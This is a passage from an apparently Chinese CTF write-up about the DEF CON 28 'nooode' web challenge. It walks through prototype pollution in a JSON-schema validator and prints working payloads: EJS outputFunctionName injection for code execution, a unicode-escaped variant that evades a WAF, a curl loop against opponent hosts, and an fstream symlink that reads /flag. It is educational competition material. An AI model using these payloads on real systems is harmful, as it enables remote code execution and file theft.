{&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x51FD;&#x6570;&#x5FAA;&#x73AF;&#x4E2D;&#xFF0C;&#x518D;&#x6B21;&#x8FDB;&#x5165;&#x5230;<code>checkProp</code>&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]){</span><br><span class="line">      value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">      value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">    <span class="hljs-comment">//i = __proto__</span></span><br><span class="line">    <span class="hljs-comment">//value = prototype</span></span><br><span class="line">    <span class="hljs-comment">//propDDef = {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x6B21;&#x7531;&#x5224;&#x65AD;&#x8FDB;&#x5165;&#x5230;<code>checkObj</code>&#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x6CE8;&#x610F;<code>value</code>&#x53C2;&#x6570;&#x5DF2;&#x7ECF;&#x88AB;&#x6307;&#x5411;<code>Function.prototype</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = prototype</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}</span></span><br><span class="line"><span class="hljs-comment">//path = &quot;__proto__&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5F53;&#x518D;&#x6B21;&#x5728;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C;<code>instance</code>&#x6B64;&#x65F6;&#x6307;&#x5411;<code>Function.prototype</code>&#xFF0C;&#x53C2;&#x6570; i &#x4E3A; <code>path</code>&#xFF0C;&#x5373;&#x88AB; <code>propDef[&apos;default&apos;]</code> &#x4FEE;&#x6539;&#x6210;&#x4E86;<code>/flag</code>&#xFF0C;&#x81F3;&#x6B64;&#x5B8C;&#x6210;&#x4E86;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//instance = prototype</span></span><br><span class="line"><span class="hljs-comment">//objTypeDef = {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}</span></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-comment">//i = path</span></span><br><span class="line">    <span class="hljs-comment">//value = undefined</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {&quot;default&quot;: &quot;/flag&quot;}</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]){</span><br><span class="line">    value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">    value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">truetrue<span class="hljs-comment">//value = &quot;/flag&quot;</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {&quot;default&quot;: &quot;/flag&quot;}</span></span><br><span class="line">    <span class="hljs-comment">//path = &quot;__proto__&quot;</span></span><br><span class="line">    <span class="hljs-comment">//i = &quot;path&quot;</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8FD9;&#x91CC;&#x5199;&#x7684;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E0D;&#x8FC7;&#x53EA;&#x8981;&#x7B80;&#x5355; debug &#x5C31;&#x53EF;&#x4EE5;&#x5F04;&#x660E;&#x767D;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x4E0D;&#x7B97;&#x5F88;&#x96BE;&#x3002;&#x6C61;&#x67D3;&#x4E86; <code>path</code> &#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8DDF;&#x524D;&#x9762;&#x7684;&#x4E00;&#x6837;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>fs.readFileSync(p.path).toString()</code>&#x6765;&#x62FF; flag &#x4E86;&#x3002;</p><p>&#x5F53;&#x7136;&#x8FD8;&#x53EF;&#x4EE5;&#x6C61;&#x67D3; express ejs </p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;__proto__&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;x;return eval(\&quot;process.mainModule.require(&apos;fs&apos;).readFileSync(&apos;/fl&apos;+&apos;ag&apos;).toString(&apos;base64&apos;)\&quot;);//x&quot;</span>},<span class="hljs-attr">&quot;path&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;/foo&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x5982;&#x679C;&#x8981;&#x6C61;&#x67D3; ejs &#x7684;&#x8BDD;&#x9700;&#x8981;&#x7528;&#x5230;<code>res.render</code>&#xFF0C;&#x800C;&#x5728; app.js &#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x7684;&#x5730;&#x65B9;&#x4F7F;&#x7528;&#x5230;&#x4E86;<code>res.render</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;ejs&quot;</span>);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-comment">// error handler</span></span><br><span class="line">app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="hljs-string">&quot;env&quot;</span>) === <span class="hljs-string">&quot;development&quot;</span> ? err: {};</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="hljs-number">500</span>);</span><br><span class="line">  res.render(<span class="hljs-string">&quot;error&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#x6765;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;<code>res.render</code>&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;}</code>&#x5C31;&#x8D77;&#x5230;&#x4E86;&#x6C61;&#x67D3;&#x4E4B;&#x524D;&#x7684; path &#x8BA9; nodejs &#x8BFB;&#x53D6;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x8FDB;&#x800C;&#x8FDB;&#x5165;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x6765;&#x5B9E;&#x73B0; ejs &#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x4E4B;&#x524D;&#x5BF9;&#x4E8E; flat &#x7684;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x540C;&#x6837;&#x7684;&#x539F;&#x7406;&#x8FDB;&#x884C; RCE &#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;__proto__.outputFunctionName&quot;</span>: <span class="hljs-string">&quot;a=1;process.mainModule.require(&apos;child_process&apos;).exec(&apos;touch /tmp/b&apos;)//&quot;</span>,<span class="hljs-attr">&quot;__proto__.path&quot;</span>: <span class="hljs-string">&quot;/foo&quot;</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6539;&#x53D8;&#x5C31;&#x662F;&#x5229;&#x7528;&#x7F16;&#x7801;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B; waf &#x5173;&#x952E;&#x5B57;&#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;__proto__&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;x;return eval(`\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\\u002e\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0028\\u0060\\u0066\\u0073\\u0060\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0046\\u0069\\u006c\\u0065\\u0053\\u0079\\u006e\\u0063\\u0028\\u0060\\u002f\\u0066\\u006c\\u0060\\u002b\\u0060\\u0061\\u0067\\u0060\\u0029\\u002e\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0060\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0060\\u0029`);//x&quot;</span>},<span class="hljs-attr">&quot;path&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;/foo&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8D5B;&#x540E;&#x8DDF; /bin/tw &#x7684;&#x9009;&#x624B;&#x4EA4;&#x6D41;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684; payload &#x5230;&#x540E;&#x9762;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x6253;&#x597D;&#x51E0;&#x4E2A;&#x961F;&#xFF0C;&#x4E8E;&#x662F;&#x53BB;&#x8981;&#x4E86;&#x4E00;&#x4EFD; POC &#xFF0C;&#x5982;&#x4E0B;&#xFF0C;&#x4E5F;&#x662F;&#x5927;&#x6982;&#x7C7B;&#x4F3C;&#x7684;&#x4E00;&#x4E2A;&#x5199;&#x6CD5;&#xFF1A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.13.37.<span class="hljs-variable">$i</span>:14017/config/validated/json-schema/validate -H <span class="hljs-string">&apos;content-type: application/json&apos;</span> --data <span class="hljs-string">&apos;{&quot;$schema&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;outputFunctionName&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;},&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;}}}}}}&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="fstream"><a href="#fstream" class="headerlink" title="fstream"></a>fstream</h3><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x6211;&#x4EEC;&#x961F;&#x5927;&#x5E08;&#x5085;&#x627E;&#x7684;</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/fstream/Writer</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line">{&quot;type&quot;:&quot;SymbolicLink&quot;,&quot;linkpath&quot;:&quot;/flag&quot;,&quot;path&quot;:&quot;public/stylesheets/11.png&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x597D;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6587;&#x6863;&#x770B;&#x4E00;&#x770B;&#xFF1A;<a href="https://github.com/npm/fstream" target="_blank" rel="noopener">https://github.com/npm/fstream</a> &#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5F53;&#x65F6;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x8FD8;&#x6363;&#x9F13;&#x4E86;&#x4E00;&#x4F1A; json &#x4F20;&#x53C2;&#x5565;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x6765;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;<code>application/x-www-form-urlencoded</code> &#x4E5F;&#x53EF;&#x4EE5;</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><h3 id="About-The-Web"><a href="#About-The-Web" class="headerlink" title="About The Web"></a>About The Web</h3><p>&#x8FD9;&#x6B21; Web &#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x6211;&#x4EEC;&#x4E5F;&#x90FD;&#x5728;&#x5410;&#x69FD;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A; Web &#x9898;&#x5F53;&#x65F6;&#x89C9;&#x5F97;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#xFF0C;&#x7B80;&#x76F4;&#x5C31;&#x76F4;&#x63A5;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x800C;&#x4E14;&#x786E;&#x5B9E;&#x6574;&#x4E2A;&#x6BD4;&#x8D5B;&#x5F04;&#x8D77;&#x6765;&#x4E0D;&#x4EC5;&#x662F; Web &#x8FD9;&#x4E2A;&#x540E;&#x95E8;&#x4F3C;&#x7684;&#x6D1E;&#xFF0C;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x9898;&#x76EE;&#x542C;&#x5176;&#x4ED6;&#x5927;&#x5E08;&#x5085;&#x5410;&#x69FD;&#x4E5F;&#x90FD;&#x662F;&#x627E;&#x540E;&#x95E8;&#x7684;&#x9898;&#x76EE;&#x3002;</p><p>&#x540E;&#x9762;&#x770B;&#x4E86;&#x51FA;&#x9898;&#x4EBA;&#x76F8;&#x5173;&#x7684;&#x8BB2;&#x8FF0;&#xFF0C;&#x8BB2;&#x8FF0;&#x89C6;&#x9891;&#x5730;&#x5740;&#xFF1A;<a href="https://www.youtube.com/watch?v=g2BDz6yHcbo" target="_blank" rel="noopener">nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003</a> &#xFF0C;&#x540E;&#x6765;&#x89C9;&#x5F97;&#x5427;&#xFF0C;&#x786E;&#x5B9E;&#x4E5F;&#x8FD8;&#x8FC7;&#x5F97;&#x53BB;&#xFF0C;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E9B;&#x591A;&#x5143;&#x5316;&#x7684;&#x8BBE;&#x8BA1;&#xFF0C;&#x56E0;&#x4E3A;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A; lib &#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x5F88;&#x591A;&#x59FF;&#x52BF;&#x53EF;&#x4EE5;&#x53BB;&#x5C1D;&#x8BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;&#x6316;&#xFF0C;&#x6BD4;&#x8D5B;&#x9014;&#x4E2D;&#x90A3;&#x6B21;&#x91CD;&#x7F6E;&#x5E94;&#x8BE5;&#x4E5F;&#x5C31;&#x662F;&#x52A0;&#x5F3A;&#x4E86; checker &#xFF0C;&#x4E5F;&#x770B;&#x5F97;&#x51FA; OOO &#x5728;&#x8FD9;&#x65B9;&#x9762;&#x8FD8;&#x662F;&#x5C3D;&#x529B;&#x4E86;&#x3002;&#xFF08;&#x5982;&#x679C;&#x4F60;&#x5220;&#x6389;&#x9898;&#x76EE;&#x7ED9;&#x7684; node_modules &#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0; install &#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x5B98;&#x65B9;&#x7ED9;&#x7684;&#x591A;&#x51FA;&#x4E00;&#x4E2A; vm2 &#xFF0C;&#x5F53;&#x65F6;&#x6211;&#x4EEC;&#x5C31;&#x5728;&#x60F3;&#x96BE;&#x4E0D;&#x6210;&#x8FD8;&#x53EF;&#x80FD;&#x662F; vm2 &#x9003;&#x9038;&#xFF1F;&#x4F46;&#x662F;&#x540E;&#x9762;&#x627E;&#x4E86;&#x4E00;&#x4F1A;&#x6CA1;&#x627E;&#x5230;&#x5C31;&#x653E;&#x5F03;&#x4E86;&#x8FD9;&#x6761;&#x8DEF;&#x3002;&#xFF08;&#xFF08;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5F53;&#x65F6;&#x60F3;&#x4E07;&#x4E00; OOO &#x8FD8;&#x522B;&#x6709;&#x7528;&#x5FC3;&#x5730;&#x518D;&#x653E;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#x5728; node_modules &#x5462;&#xFF1F;&#x6BD5;&#x7ADF; Backdooor CTF</p><p>&#x8FD9;&#x6B21;&#x867D;&#x7136;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x4E5F;&#x8BA9;&#x6211;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E9B;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x8BBE;&#x8BA1; AWD Web &#x9898;&#x76EE;&#x7684;&#x601D;&#x8003;&#xFF0C;&#x5305;&#x62EC; @Zach Wade &#x4E5F;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x60F3;&#x6CD5;:</p><blockquote><p>&#x200B;    Although I might sound frustrated by this, I think it&#x2019;s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.</p></blockquote><h3 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h3><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4E8B;&#x5C31;&#x662F;&#xFF0C;A0E &#x7684;&#x540C;&#x5B66;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x961F;&#x7684;&#x5927;&#x5E08;&#x5085;&#x624B;&#x7ED5; A0E &#x5982;&#x679C;&#x518D;&#x591A;&#x6253;&#x4E00;&#x8F6E;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6B21;&#x7684;&#x7ED3;&#x679C;&#x5C31;&#x4E0D;&#x4E00;&#x6837;&#x4E86;&#xFF0C;&#x4E5F;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x4FDD;&#x8BC1;&#x4E86;&#x4E0E; PPP &#x9AD8;&#x51FA;&#x7684;&#x4E24;&#x5206;&#x7684;&#x5DEE;&#x8DDD;&#x3002;&#xFF08;&#x8FD9;&#x96BE;&#x9053;&#x4E0D;&#x503C;&#x5F97;&#x4E00;&#x987F;&#x996D;&#x5417;&#xFF1F;</p><p>&#x6839;&#x636E;&#x4E00;&#x4E9B;&#x73B0;&#x6709;&#x7684;&#x62A5;&#x9053;&#xFF0C;&#x4EE5;&#x53CA;&#x5411;&#x4E00;&#x4E9B; A0E &#x7684;&#x540C;&#x5B66;&#x8003;&#x8BC1;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#x4ED6;&#x4EEC;&#x771F;&#x7684;&#x662F;&#x5F88;&#x65E9;&#x5C31;&#x51C6;&#x5907;&#x4E86;&#x5417;&#xFF1F;&#x771F;&#x7684;&#x6709;&#x5BF9;&#x6BCF;&#x4E2A;&#x4EBA;&#x5206;&#x7279;&#x6027;&#xFF0C;&#x6BCF;&#x4E2A;&#x4EBA;&#x64C5;&#x957F;&#x4EC0;&#x4E48;&#x5417;&#x7B49;&#x7B49;&#x95EE;&#x9898;&#xFF0C;&#x90FD;&#x5F97;&#x5230;&#x4E86;&#x80AF;&#x5B9A;&#x7684;&#x56DE;&#x7B54;&#xFF0C;&#x4E0D;&#x5F97;&#x4E0D;&#x4F69;&#x670D; A0E &#x7684;&#x56E2;&#x961F;&#x7BA1;&#x7406;&#x534F;&#x4F5C;&#x80FD;&#x529B; orz &#x800C;&#x4E14;&#x6839;&#x636E;&#x4ED6;&#x4EEC;&#x7ED3;&#x675F;&#x5F53;&#x5929;&#x7684;&#x5408;&#x7167;&#x6765;&#x770B;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x6709;50&#x591A;&#x4EBA;&#x5DE6;&#x53F3;&#x5427;&#x3002;&#xFF08;&#x636E;&#x8BF4; Samurai &#x53C2;&#x8D5B;&#x4EBA;&#x6570;&#x8FBE;&#x5230;&#x4E86;&#x6050;&#x6016;&#x7684;150&#x4EBA;</p><p>&#x867D;&#x7136; PPP &#x8868;&#x793A;&#x81EA;&#x5DF1; &#x201C;Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.&#x201D; &#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5C55;&#x793A;&#x51FA;&#x4E86;&#x4E00;&#x5982;&#x65E2;&#x5F80;&#x5BF9; DEFCON 